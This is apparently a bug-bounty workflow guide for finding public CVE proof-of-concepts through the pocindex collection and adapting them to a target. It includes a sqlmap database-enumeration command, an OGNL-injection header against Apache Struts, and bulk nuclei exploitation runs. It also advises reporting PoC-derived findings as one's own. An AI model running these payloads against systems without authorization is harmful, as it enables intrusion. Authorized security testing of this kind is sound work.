# PoC Index Execution Workflow — How to Use 82K+ PoCs During Audit
> Source: 0xMarcio/pocindex (83,082 CVEs with PoC links)

## Quick Reference — 3 Methods

### Method 1: Direct CVE Lookup (fastest)
If you know the CVE number:
```bash
# Get PoC details for specific CVE
curl -sL "https://raw.githubusercontent.com/0xMarcio/pocindex/main/cves/2026/CVE-2026-3854.md"
curl -sL "https://raw.githubusercontent.com/0xMarcio/pocindex/main/cves/2025/CVE-2025-3248.md"
```

### Method 2: Website Search (best for discovery)
```
https://pocindex.io/
```
Search by: CVE number, vendor, product, keyword

### Method 3: GitHub Code Search (for keyword discovery)
```bash
# Search by vendor/product keyword
curl -sL "https://api.github.com/search/code?q=repo:0xMarcio/pocindex+KEYWORD+extension:md&per_page=10"

# Examples:
# WordPress CVEs
curl -sL "https://api.github.com/search/code?q=repo:0xMarcio/pocindex+wordpress+extension:md&per_page=10"

# Apache CVEs
curl -sL "https://api.github.com/search/code?q=repo:0xMarcio/pocindex+apache+extension:md&per_page=10"

# Jenkins CVEs
curl -sL "https://api.github.com/search/code?q=repo:0xMarcio/pocindex+jenkins+extension:md&per_page=10"
```

## Audit Workflow — Step by Step

### Step 1: Identify Target Tech Stack
```bash
# From recon phase output, identify:
# - CMS (WordPress, Jenkins, GitLab, etc.)
# - Framework (Apache, NGINX, Node.js, etc.)
# - Language (PHP, Java, Python, etc.)
# - Version numbers
```

### Step 2: Search pocindex for Matching CVEs
```bash
# By product name
curl -sL "https://api.github.com/search/code?q=repo:0xMarcio/pocindex+PRODUCT_NAME+extension:md&per_page=10"

# By CVE year + keyword
curl -sL "https://api.github.com/search/code?q=repo:0xMarcio/pocindex+CVE-2026+KEYWORD+extension:md&per_page=10"
```

### Step 3: Read CVE File → Get PoC Links
```bash
# Each CVE file contains:
# - Description of vulnerability
# - Affected versions
# - CWE classification
# - PoC GitHub repo URLs
# - Reference links

# Example output:
# ### POC
# #### Github
# - https://github.com/author/CVE-2026-XXXX-PoC
# - https://github.com/author/CVE-2026-XXXX-exploit
```

### Step 4: Study PoC → Understand Attack Pattern
```bash
# Clone the PoC repo (SAFETY CHECK FIRST!)
# Read the exploit code to understand:
# - What vulnerability class (SQLi, XSS, SSRF, RCE, etc.)
# - What payload is used
# - What endpoint is targeted
# - What conditions trigger the bug
```

### Step 5: Adapt to Your Target
```bash
# DON'T run the PoC directly on target (unauthorized!)
# DO use the technique/pattern on YOUR target:
# - Same vuln class, different endpoint
# - Same payload structure, adapted to target's input
# - Same bypass technique, applied to target's WAF
```

## Practical Example — Full Workflow

### Scenario: Target runs WordPress 6.4
```bash
# 1. Search WordPress CVEs
curl -sL "https://api.github.com/search/code?q=repo:0xMarcio/pocindex+wordpress+6.4+extension:md&per_page=5"

# 2. Found CVE-2024-XXXXX (SQLi in WP REST API)
curl -sL "https://raw.githubusercontent.com/0xMarcio/pocindex/main/cves/2024/CVE-2024-XXXXX.md"

# 3. PoC repo: https://github.com/author/CVE-2024-XXXXX-PoC
# Study it → learn the SQLi technique

# 4. Apply to YOUR target:
sqlmap -u "https://your-target.com/wp-json/wp/v2/posts?search=test" --batch --dbs
```

### Scenario: Target runs Apache Struts
```bash
# 1. Search Struts CVEs
curl -sL "https://api.github.com/search/code?q=repo:0xMarcio/pocindex+struts+extension:md&per_page=5"

# 2. Found CVE-2023-XXXXX (OGNL injection RCE)
curl -sL "https://raw.githubusercontent.com/0xMarcio/pocindex/main/cves/2023/CVE-2023-XXXXX.md"

# 3. PoC shows OGNL injection in Content-Type header
# 4. Test YOUR target:
curl -v -H "Content-Type: %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Test','RCE')}.multipart/form-data" https://your-target.com/action
```

## Safety Rules
1. **NEVER run PoC directly on target** — study pattern only
2. **ALWAYS safety check PoC repo** before cloning (check for malicious code)
3. **ALWAYS work within authorized scope** — bug bounty program rules
4. **Document everything** — which PoC inspired which test
5. **Report as your own finding** — PoC is reference, not your exploit

## LOCAL POCINDEX (173,135 CVEs — Fast Access)

### Lokasi
```
D:/data hermes/pocindex/cves/
├── 1999/ ... 2026/
├── 10,458 CVEs di 2026
└── 173,135 total CVEs
```

### Quick Search
```bash
# Search by product
grep -rl "wordpress" D:/data/hermes/pocindex/cves/2026/

# Search by CVE class
grep -rl "sql injection" D:/data/hermes/pocindex/cves/2026/

# Search by vendor
grep -rl "apache" D:/data/hermes/pocindex/cves/2026/

# Count CVEs per year
for y in D:/data/hermes/pocindex/cves/*/; do
  echo "$(basename $y): $(ls $y | wc -l)"
done
```

### Audit Workflow
```
Phase 0C:
  1. Identify target tech stack
  2. Search pocindex for matching CVEs
  3. Read CVE files → get PoC links
  4. Study PoC patterns
  5. Adapt to target
  6. Execute adapted payload
  7. Document results
```

## YAML TEMPLATES (Ready-to-Use Exploitation)

### Sources
```
1. Nuclei Templates (community): D:/data/hermes/nuclei-templates/
   - 4,490 CVE YAML templates
   - Complete step-by-step exploitation

2. AI Nuclei Templates: D:/data/hermes/nuclei-templates-ai/
   - 2,529 CVE YAML templates
   - AI-generated for uncovered CVEs

3. CVE-Exploits: D:/data/hermes/cve-exploits/
   - Python scripts + YAML templates
```

### Search by Product
```bash
# Find templates for specific product
find D:/data/hermes/nuclei-templates -name "CVE-*.yaml" | xargs grep -l "apache"
find D:/data/hermes/nuclei-templates-ai -name "CVE-*.yaml" | xargs grep -l "redis"

# Count templates per year
for y in D:/data/hermes/nuclei-templates/http/cves/*/; do
  echo "$(basename $y): $(ls $y/*.yaml 2>/dev/null | wc -l)"
done
```

### Execute Templates
```bash
# Single template
nuclei -u https://target.com -t template.yaml

# All templates for a year
nuclei -u https://target.com -t D:/data/hermes/nuclei-templates/http/cves/2025/

# All CVE templates
nuclei -u https://target.com -t D:/data/hermes/nuclei-templates/http/cves/
```
